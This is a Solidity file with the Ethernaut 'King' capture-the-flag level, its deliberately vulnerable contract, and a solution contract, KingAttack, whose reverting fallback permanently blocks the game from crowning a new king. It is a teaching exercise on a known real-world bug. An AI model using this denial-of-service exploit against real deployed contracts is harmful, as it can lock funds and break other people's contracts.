
/* King
Level completed!
Difficulty 6/10

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

Most of Ethernaut's levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.

In this case, see: King of the Ether and King of the Ether Postmortem

 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
      // the attacking contract will provide larger value in its public payable constructor when deploying
    require(msg.value >= prize || msg.sender == owner);
    // The attack contract will either not include a fallback method at all which would normally facilitate this
    // or it will include a fallback method that will not allow the attack contract to be the king by reverting in the fallback function.
    // which will cause the below to fail, thereby not allowing new king
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

// 
Solution
pragma solidity ^0.4.0;


contract KingAttack {

// The address of King contract  is copied and used as payable value 
// when deploying this. This will cause this contract address to be the king
// and prevent new user/caller from transferring to it as its fallback function
// reverts. We can also do without the fallback function which will
// still prevent user King contract failing and not able to assign a new king
constructor(address _kingAddress) public payable{
    // pay money into the king contract greater than present value
    address(_kingAddress).call.value(msg.value)();
    
}

function() external payable {
    // This is not necessay but makes it fail if they attampt to call a fallback method on this contract
    revert("I broke it. haha!");
}
}
